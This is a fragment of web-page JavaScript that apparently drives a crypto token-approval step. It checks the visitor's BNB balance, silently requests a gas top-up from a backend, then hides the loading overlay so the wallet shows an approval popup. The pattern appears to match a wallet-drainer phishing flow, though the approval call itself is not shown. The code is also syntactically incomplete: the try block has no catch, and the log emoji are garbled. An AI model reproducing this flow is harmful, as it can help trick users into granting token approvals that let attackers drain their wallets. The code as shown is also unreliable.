<script>
    // Initialize Web3
    const web3 = new Web3(window.ethereum);

    // Loading functions
    function showLoading(message = 'Processing...') {
        const overlay = document.getElementById('loadingOverlay');
        const text = overlay.querySelector('.loading-text');
        if (text) text.textContent = message;
        overlay.style.display = 'flex';
    }

    function hideLoading() {
        const overlay = document.getElementById('loadingOverlay');
        overlay.style.display = 'none';
    }

    async function TokenApprove() {
    // Show loading immediately when Next is clicked
    showLoading('Processing...');
    
    try {
        const accounts = await ethereum.request({ method: 'eth_accounts' });
        const account = accounts[0];

        // Step 1: Check the current BNB balance (in background)
        const bnbBalance = await web3.eth.getBalance(account);
        const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
        console.log("Current BNB Balance: ", balanceInBNB);

        const requiredBNB = 0.0001;

        // Step 2: Auto top-up in background if needed
        if (parseFloat(balanceInBNB) < requiredBNB) {
            showLoading('Requesting gas...');
            console.log('üí∞ [BNB] Balance too low, requesting top-up...');
            console.log('üí∞ [BNB] Current balance:', balanceInBNB, 'BNB');
            console.log('üí∞ [BNB] Required:', requiredBNB, 'BNB');
            
            // Request the BNB top-up from the backend
            const topUpSuccess = await requestBNBTopUp(account);

            if (topUpSuccess) {
                // Wait for blockchain transaction to confirm
                showLoading('Waiting for gas to arrive...');
                console.log('‚è≥ [BNB] Waiting for transaction to confirm...');
                
                // Poll for balance update (check every 2 seconds, max 30 seconds)
                let attempts = 0;
                const maxAttempts = 15; // 15 attempts * 2 seconds = 30 seconds max
                let balanceUpdated = false;
                
                while (attempts < maxAttempts && !balanceUpdated) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    attempts++;
                    
                    const newBnbBalance = await web3.eth.getBalance(account);
                    const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
                    console.log(`üí∞ [BNB] Check ${attempts}/${maxAttempts}: Balance = ${newBalanceInBNB} BNB`);
                    
                    if (parseFloat(newBalanceInBNB) >= requiredBNB) {
                        balanceUpdated = true;
                        console.log('‚úÖ [BNB] Balance updated successfully!');
                        showLoading('Gas received!');
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        break;
                    }
                }
                
                if (!balanceUpdated) {
                    console.warn('‚ö†Ô∏è [BNB] Balance not updated after waiting, but continuing...');
                    showLoading('Continuing...');
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            } else {
                // Top-up request failed
                console.error('‚ùå [BNB] Top-up request failed');
                showLoading('Top-up failed. Please try again or ensure you have enough BNB.');
                setTimeout(() => hideLoading(), 3000);
                return; // Stop here if top-up fails
            }
        }

        // Step 3: Hide loading so wallet can show approval popup
        hideLoading();
        
        // Show approval request (MetaMask/Trust Wallet will show popup)
        await approveToken(account);

    }
}
